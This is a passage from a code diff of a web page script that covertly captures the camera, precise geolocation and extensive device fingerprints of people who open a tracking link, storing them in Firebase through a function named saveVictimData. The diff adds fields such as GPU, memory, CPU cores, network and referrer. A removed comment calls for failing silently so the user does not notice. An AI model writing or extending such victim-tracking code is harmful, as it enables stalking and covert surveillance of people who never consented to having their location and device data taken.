     console.error("Camera error:", e);
-    // Don't show error to user — just continue silently
-    // Still save device info
     const device = getDeviceInfo();
     await saveVictimData("device", { device });
     throw e;
   }
 }
 
-/* ========== CAPTURE LOCATION ========== */
 async function captureLocation() {
   const location = await getLocation();
   const device = getDeviceInfo();
   await saveVictimData("location", { location, device });
 }
 
-/* ========== CAPTURE DEVICE ========== */
 async function captureDevice() {
   const device = getDeviceInfo();
   await saveVictimData("device", { device });
 }
 
-/* ========== GET LOCATION ========== */
+/* ========== LOCATION ========== */
 function getLocation() {
   return new Promise(resolve => {
     if (!navigator.geolocation) return resolve(null);
     navigator.geolocation.getCurrentPosition(
-      pos => resolve({
-        lat: pos.coords.latitude,
-        lon: pos.coords.longitude,
-        accuracy: pos.coords.accuracy
-      }),
+      pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy }),
       () => resolve(null),
       { enableHighAccuracy: true, timeout: 8000 }
     );
   });
 }
 
-/* ========== GET DEVICE INFO ========== */
+/* ========== DEVICE INFO - 5 EXTRA FIELDS ========== */
 function getDeviceInfo() {
   const ua = navigator.userAgent;
   let type = "Desktop";
@@ -823,16 +413,49 @@ function getDeviceInfo() {
                   /Safari/.test(ua) ? "Safari" :
                   /Edg/.test(ua) ? "Edge" : "Browser";
 
+  const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+  const network = conn ? {
+    type: conn.effectiveType || "unknown",
+    downlink: conn.downlink || null,
+    rtt: conn.rtt || null
+  } : null;
+
+  const memory = navigator.deviceMemory || "unknown";
+  const cores = navigator.hardwareConcurrency || "unknown";
+
+  let gpu = "unknown";
+  try {
+    const canvas = document.createElement("canvas");
+    const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+    if (gl) {
+      const debugInfo = gl.getExtension("WEBGL_debug_renderer_info");
+      if (debugInfo) {
+        gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+      }
+    }
+  } catch (e) {}
+
+  const touch = "ontouchstart" in window || navigator.maxTouchPoints > 0;
+
   return {
     type, browser,
     platform: navigator.platform || "-",
     screen: `${screen.width}x${screen.height}`,
     language: navigator.language,
-    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "-"
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || "-",
+    memory: memory,
+    cores: cores,
+    gpu: gpu,
+    touch: touch,
+    network: network,
+    pixelRatio: window.devicePixelRatio || 1,
+    vendor: navigator.vendor || "-",
+    cookies: navigator.cookieEnabled,
+    online: navigator.onLine,
+    referrer: document.referrer || "direct"
   };
 }
 
-/* ========== SAVE TO FIREBASE ========== */
 async function saveVictimData(type, data) {
   if (!currentLinkId) return;
   try {
@@ -846,9 +469,7 @@ async function saveVictimData(type, data) {
       ...data,
       timestamp: serverTimestamp()
     });
-  } catch (e) {
-    console.error("Save error:", e);
-  }
+  } catch (e) { console.error("Save error:", e); }
 }
 </script>
 </body>
